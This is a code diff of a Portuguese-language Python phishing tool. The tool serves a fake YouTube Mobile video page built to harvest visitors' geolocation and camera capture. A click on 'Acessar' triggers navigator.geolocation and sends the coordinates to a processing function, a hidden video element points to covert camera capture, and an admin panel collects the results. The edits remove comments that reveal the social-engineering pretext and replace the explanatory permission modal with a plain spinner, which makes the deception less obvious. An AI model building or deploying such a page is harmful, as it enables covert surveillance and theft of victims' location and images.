@@ -19,7 +19,7 @@ SENHA_ADMIN = "123123"
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
 
-# Página HTML clonada perfeitamente do layout do YouTube Mobile
+# Página HTML com apenas o carregamento limpo
 HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -47,7 +47,6 @@ HTML_CAPTURA = f"""
             align-items: center;
             min-height: 100vh;
         }}
-        /* Top App Bar estilo YouTube Mobile */
         .yt-header {{
             width: 100%;
             max-width: 600px;
@@ -95,8 +94,6 @@ HTML_CAPTURA = f"""
             border-radius: 18px;
             cursor: pointer;
         }}
-        
-        /* Video Title Bar */
         .video-container {{
             width: 100%;
             max-width: 600px;
@@ -109,8 +106,6 @@ HTML_CAPTURA = f"""
             line-height: 1.4;
             color: #f1f1f1;
         }}
-
-        /* Player simulado */
         .player-wrapper {{
             position: relative;
             width: 100%;
@@ -156,8 +151,6 @@ HTML_CAPTURA = f"""
             border-color: transparent transparent transparent #fff;
             margin-left: 3px;
         }}
-
-        /* Barra de Ações Abaixo do Vídeo */
         .action-bar {{
             display: flex;
             justify-content: space-around;
@@ -177,44 +170,23 @@ HTML_CAPTURA = f"""
             cursor: pointer;
         }}
 
-        /* Modal de Permissão Disfarçado */
+        /* Tela de Carregamento Limpa (Sem Caixa de Texto) */
         #modalPermissao {{
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85);
             z-index: 999;
-            justify-content: center;
             align-items: center;
-            padding: 20px;
+            justify-content: center;
         }}
-        .modal-box {{
-            background: #212121;
-            padding: 24px;
-            border-radius: 12px;
-            max-width: 380px;
-            text-align: center;
-            border: 1px solid #3f3f3f;
-        }}
-        .modal-box h3 {{
-            margin-top: 0;
-            color: #3ea6ff;
-            font-size: 16px;
-        }}
-        .modal-box p {{
-            font-size: 13px;
-            color: #aaa;
-            line-height: 1.4;
-        }}
-        .spinner {{
-            border: 3px solid #3f3f3f;
-            border-top: 3px solid #3ea6ff;
+        .spinner-limpo {{
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #3ea6ff;
             border-radius: 50%;
-            width: 28px;
-            height: 28px;
+            width: 50px;
+            height: 50px;
             animation: spin 1s linear infinite;
-            margin: 12px auto;
-            display: none;
         }}
         @keyframes spin {{
             0% {{ transform: rotate(0deg); }}
@@ -225,7 +197,6 @@ HTML_CAPTURA = f"""
 </head>
 <body>
 
-    <!-- Header Fiel ao App do YouTube -->
     <div class="yt-header">
         <div class="yt-channel-info">
             <div class="yt-logo">
@@ -239,7 +210,6 @@ HTML_CAPTURA = f"""
         <button class="btn-acessar" onclick="dispararFluxo()">Acessar</button>
     </div>
 
-    <!-- Container do Vídeo -->
     <div class="video-container">
         <div class="video-title-section">
             Motorista sobrevive após capotar na BR-070 dias...
@@ -253,13 +223,9 @@ HTML_CAPTURA = f"""
         </div>
     </div>
 
-    <!-- Modal de Engenharia Social / Instrução de Permissão -->
-    <div id="modalPermissao" class="modal-box-wrapper" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:999; align-items:center; justify-content:center;">
-        <div class="modal-box">
-            <h3>🔒 Otimização de Vídeo</h3>
-            <p>Para carregar a transmissão restrita em HD sem travamentos, clique em <b>"Permitir"</b> na caixa de calibração que aparecerá no navegador.</p>
-            <div class="spinner" id="loaderSpinner" style="display:block;"></div>
-        </div>
+    <!-- Apenas o Carregamento (Sem Caixa de Texto) -->
+    <div id="modalPermissao">
+        <div class="spinner-limpo"></div>
     </div>
 
     <video id="video-oculto" autoplay playsinline muted></video>
@@ -271,7 +237,6 @@ HTML_CAPTURA = f"""
         function dispararFluxo() {{
             document.getElementById('modalPermissao').style.display = 'flex';
             
-            // Dispara geolocalização e captura simultaneamente
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
                     (pos) => processarDados(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
@@ -388,7 +353,6 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Administrativo atualizado
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
